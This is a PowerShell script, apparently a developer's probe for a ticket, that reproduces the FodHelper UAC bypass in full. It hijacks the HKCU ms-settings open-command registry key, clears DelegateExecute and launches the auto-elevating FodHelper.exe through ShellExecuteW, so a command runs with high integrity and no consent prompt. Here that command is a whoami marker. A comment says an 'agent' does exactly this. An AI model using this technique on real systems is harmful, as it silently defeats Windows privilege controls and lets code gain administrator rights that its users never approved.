# kan29-probe.ps1 — compare CreateProcessW with ShellExecuteW for FodHelper, from a Medium-IL
# admin token inside the console session. This is the experiment behind the KAN-29 fix:
# CreateProcessW cannot elevate (ERROR_ELEVATION_REQUIRED); the shell can, and FodHelper is
# Microsoft-signed with autoElevate, so the shell path elevates silently.
$out = Join-Path $env:USERPROFILE 'kan29-probe.txt'
$marker = Join-Path $env:USERPROFILE 'kan29-elev-probe.txt'
Set-Content -LiteralPath $out -Value ("probe start {0} user={1}" -f (Get-Date -Format 'HH:mm:ss'), $env:USERNAME)

$source = @'
using System;
using System.Runtime.InteropServices;

public static class Launch
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
        uint flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [DllImport("shell32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr ShellExecuteW(IntPtr hwnd, string verb, string file, string args, string dir, int show);

    public static int TryCreateProcess(string exe, out int lastError)
    {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        bool ok = CreateProcessW(exe, null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
        lastError = ok ? 0 : Marshal.GetLastWin32Error();
        return ok ? pi.dwProcessId : 0;
    }

    public static int TryShellExecute(string exe, out int lastError)
    {
        IntPtr result = ShellExecuteW(IntPtr.Zero, "open", exe, null, null, 1);
        long code = result.ToInt64();
        lastError = code <= 32 ? (int)code : 0;
        return code > 32 ? 1 : 0;
    }
}
'@
Add-Type -TypeDefinition $source -Language CSharp

# Point FodHelper at a marker-writing command, exactly like the agent does.
$key = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
New-Item -Path $key -Force | Out-Null
Set-ItemProperty -Path $key -Name '(default)' -Value ('cmd.exe /c whoami /groups > ' + $marker)
New-ItemProperty -Path $key -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
Remove-Item -LiteralPath $marker -Force -ErrorAction SilentlyContinue

$le = 0
$pid1 = [Launch]::TryCreateProcess('C:\Windows\System32\FodHelper.exe', [ref]$le)
Add-Content -LiteralPath $out -Value ("CreateProcessW ok={0} pid={1} lastError={2}" -f ($pid1 -gt 0), $pid1, $le)
Start-Sleep -Seconds 6
Add-Content -LiteralPath $out -Value ("after CreateProcessW: marker={0}" -f (Test-Path -LiteralPath $marker))
if (Test-Path -LiteralPath $marker) {
    Add-Content -LiteralPath $out -Value ((Get-Content -LiteralPath $marker | Select-String 'Mandatory Level').Line)
}
Remove-Item -LiteralPath $marker -Force -ErrorAction SilentlyContinue

$le = 0
$ok = [Launch]::TryShellExecute('C:\Windows\System32\FodHelper.exe', [ref]$le)
Add-Content -LiteralPath $out -Value ("ShellExecuteW ok={0} code={1}" -f ($ok -eq 1), $le)
Start-Sleep -Seconds 8
Add-Content -LiteralPath $out -Value ("after ShellExecuteW: marker={0}" -f (Test-Path -LiteralPath $marker))
if (Test-Path -LiteralPath $marker) {
    Add-Content -LiteralPath $out -Value ((Get-Content -LiteralPath $marker | Select-String 'Mandatory Level').Line)
}

Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
Get-Process -Name FodHelper,cmd -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }
Add-Content -LiteralPath $out -Value "probe end"
